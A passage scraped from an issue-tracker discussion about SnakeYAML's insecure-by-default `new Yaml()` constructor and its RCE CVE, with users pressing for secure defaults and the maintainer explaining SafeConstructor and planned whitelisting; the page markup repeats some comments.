In the end the situation is at it is today and will not change in the near future. The best defenses against security threads are still the old common-sense ones, and it was already mentioned: be secure by default as best as possible. That is why programming languages exist, that simply don’t allow buffer overruns: because otherwise, buffer overruns _will happen_. The only way to truly prevent them in all circumstances is to use such a language. Yes, that doesn’t prevent other security issues, but it prevents a whole class of very dangerous ones.

With the child analogy: you cannot put everything in safe containers, but you must do it for those items which can be really harmful - such as meds or pipe cleaners. Because you _know_ that children taste everything and it will be dangerous if they try these items. And you _know_ that exactly this has happened before. And you don’t want your child in the hospital because of such an accident, which could have been prevented by _such a small and cheap measure_ as using a safe container! The same argument holds true for this case: you prevent RCI vulnerabilities in default constructors because you _know_ that most developers will use the default in the first place, and because you _know_ that RCI is harmful and has happened before."

         data-content="Hi, I created an issue to response and give my opinion as an indirect user of SnakeYaml.

**Re: SnakeYaml as a transitive dependency**

I have control over a large \(enterprise size\) Java web-app with SnakeYaml as one of its transitive dependencies, not a direct dependency. The library that includes SnakeYaml has not upgraded its usage to the secure contructor, which means that its default is unsecure.   
Unknown when/if they will do that.

&gt; I assume you are not affected at all, because if you are you could have solved it already \(if you not need a release for that\). You use SnakeYAML as transitive dependency. It means that the library which does use SnakeYAML has to be changed \(The version 2.0 is not backwards compatible.\). You cannot simply provide another version of SnakerYAML at runtime, it may or may not work. I already prepared a PR for Spring, but I am waiting.

This is simply not true. It is trivial to put an upgrade snakeyaml dependency in the dependencyManagement section of our maven project and use the newer snakeyaml version together with the not-upgraded library. This ofcourse will only work if you do not make breaking changes in snakeyaml, like changing method signatures.  
But this method has worked quite well for minor version security updates in the past.  
At some point we can remove the entry in dependencyManagement. 

Not ideal for management, but it definitely works.

_This makes releasing snakeyaml 1.34 which changes the behaviour regarding whitelisting very useful for many enterprises._   

**Re: Default behaviour**

In my opinion, if you strip away all emotions, and dig deep enough you end up with the root cause of this discussion:  
_The default behaviour of snakeyaml \(_`new Yaml()` _\) which you documented in examples is unsecure by default._  
One of the core design principes of OWASP is “Establish secure defaults” and a “Secure-by-default design”. In the current released version the simple fact is that `new Yaml()` is _not secure_.

You can argue all you want about use-cases and people should use the other constructor \(which one some level you may be right about in an ideal world\), but there is still the fact that by having an unsecure default, people who are not as knowledgable as you may end up in trouble because snakeyaml was used insecurely.

_So, my plea is again: Make \(and release\) snakeyaml secure by default and make the world a slightly better \(Java\) place by doing so._

‌

**Re: “Low quality tooling”**

You keep using that term, but I suggest you stop doing so. The current tooling you probably mean \(SonarQube, VeraCode, Snyk\) are definitely not perfect, but are a very good means to be aware of possible security issues.

Even if they give 99 alerts which are not relevant for an enterprise \(eg. like snakeyaml in many of our use-cases\), the 1 enterprise where snakeyaml _is_ an issue is definitely happy that they use the security tooling to catch it.

So, from your perspective \(as library author\) the security tooling may be noise, but it definitely is not for larger enterprises.

_So, my suggestion here is: drop the bashing on those tools_. _They serve a purpose for many of us in large enterprises._  
_You may not like what they reported, but when looking at simple facts, what they reported was true:_   
_An insecure default which MAY BE a problem when chained/used in a larger attack on a company._

‌

Last suggestion: You seem to be vary wary of this long-running issue.   
”Giving in” to \(other\) expert opinions is not a failure on your part. But it will make the current problems and discussions stop right away… 

Just do it, release a secure-by-default version and observe the quiet afterwards…"

    <p>Hi, I created an issue to response and give my opinion as an indirect user of SnakeYaml.</p>
<p><strong>Re: SnakeYaml as a transitive dependency</strong></p>
<p>I have control over a large (enterprise size) Java web-app with SnakeYaml as one of its transitive dependencies, not a direct dependency. The library that includes SnakeYaml has not upgraded its usage to the secure contructor, which means that its default is unsecure. <br>
Unknown when/if they will do that.</p>
<blockquote>
<p>I assume you are not affected at all, because if you are you could have solved it already (if you not need a release for that). You use SnakeYAML as transitive dependency. It means that the library which does use SnakeYAML has to be changed (The version 2.0 is not backwards compatible.). You cannot simply provide another version of SnakerYAML at runtime, it may or may not work. I already prepared a PR for Spring, but I am waiting.</p>
</blockquote>
<p>This is simply not true. It is trivial to put an upgrade snakeyaml dependency in the dependencyManagement section of our maven project and use the newer snakeyaml version together with the not-upgraded library. This ofcourse will only work if you do not make breaking changes in snakeyaml, like changing method signatures.<br>
But this method has worked quite well for minor version security updates in the past.<br>
At some point we can remove the entry in dependencyManagement. </p>
<p>Not ideal for management, but it definitely works.</p>
<p><em>This makes releasing snakeyaml 1.34 which changes the behaviour regarding whitelisting very useful for many enterprises.</em>   </p>
<p><strong>Re: Default behaviour</strong></p>
<p>In my opinion, if you strip away all emotions, and dig deep enough you end up with the root cause of this discussion:<br>
<em>The default behaviour of snakeyaml (</em><code>new Yaml()</code> <em>) which you documented in examples is unsecure by default.</em><br>

I may know that the source is coming from Joe Smith \(as he has authenticated\) - but that does not in any way mean that I wish to allow Joe to run **arbitrary code** \(or any code\) on my service.

to “study the settings” results in a 404 [https://github.com/google/oss-fuzz/blob/master/projects/snakeyaml/YamlFuzzer.java](https://github.com/google/oss-fuzz/blob/master/projects/snakeyaml/YamlFuzzer.java)

&gt; I assume you are not affected at all, because if you are you could have solved it already \(if you not need a release for that\)

As an author of a service that does take and parse YAML from authenticated - yet **untrusted** users \(where a user can be both a Human and 3rd party web service\) I am confused as to what I should be doing to be secure given the documentation is scattered or missing.

I’m sure it is annoying to have to respond to all these myriad of questions and comments - but what I think would help the majority here is a page that describes what you need to do when the YAML is untrusted.

Does this exist in a single place that outlines what needs to be done and where?

excepting a DoS \(not talking about that here - just RCE\) is `new Yaml(new SafeConstructor()).load(stream)` safe?"

<p>to “study the settings” results in a 404 <a data-is-external-link="true" href="https://github.com/google/oss-fuzz/blob/master/projects/snakeyaml/YamlFuzzer.java" rel="nofollow">https://github.com/google/oss-fuzz/blob/master/projects/snakeyaml/YamlFuzzer.java</a></p>

<p>I assume you are not affected at all, because if you are you could have solved it already (if you not need a release for that)</p>

<p>As an author of a service that does take and parse YAML from authenticated - yet <strong>untrusted</strong> users (where a user can be both a Human and 3rd party web service) I am confused as to what I should be doing to be secure given the documentation is scattered or missing.</p>
<p>I’m sure it is annoying to have to respond to all these myriad of questions and comments - but what I think would help the majority here is a page that describes what you need to do when the YAML is untrusted.</p>
<p>Does this exist in a single place that outlines what needs to be done and where?</p>
<p>excepting a DoS (not talking about that here - just RCE) is <code>new Yaml(new SafeConstructor()).load(stream)</code> safe?</p>

         data-content="@{557058:fb5585f9-b588-45d6-b60a-5285fda99c7e} this is a very good question.

The `SafeConstructor` is \(and always was\) very restrictive and it does not allow custom classes. [You can see it in the tests.](https://bitbucket.org/snakeyaml/snakeyaml/src/master/src/test/java/org/yaml/snakeyaml/constructor/SafeConstructorTest.java) \(neither `loadAs()` nor global tags can create instances of custom classes\)

`Constructor` will be provided with the kind of white list with the classes to be allowed to create.

I see now that the API is inconsitent - `SafeConstrictor` does not respect `TagInspector` and `Constructor` can have the same functionality as `SafeConstructor` \(which makes `SafeConstructor` redundant\)  
Your proposal is welcome. It is not too late the change the API."

         data-content="Hi,

I know I’m late to the party and I wanted to put my 2 cents in, since it appears there is a lot of confusion regarding this CVE and I hope to understand both sides. I also apologize in advance if I slightly miss the mark.

The root of the issue is probably the misinterpretation that “it is safe by default”, while the sankeyaml advocates to use `SafeConstructor` for user provided input and the “poor CVE tooling” cannot distinguisish how the lib is exactly used, reporting “false positives”. It’s a perfect triangle where everyone is neither completely right nor wrong at the same time.

It's what it is now. Even if Spring and co. use this library correctly and are not vulnerable, CVE detection tools simply cannot distinguish usage. It’s not a trivial task either.

Perhaps if the `Constructor` was called `PriviledgedConstructor` in contrast to the `SafeConstructor`, and “deserialize/instaciate any class” was opt-in in yaml rather than the default, all of this would probably have been avoided. ...I think that's what triggered it all, the &quot;default out-of-the-box usage&quot;, not how it's used &quot;safely&quot;.

It is very nice to hear that a version 2.0 which reverses this default is planned.

Lastly, thank you very much for your time and effort in maintaining this software."
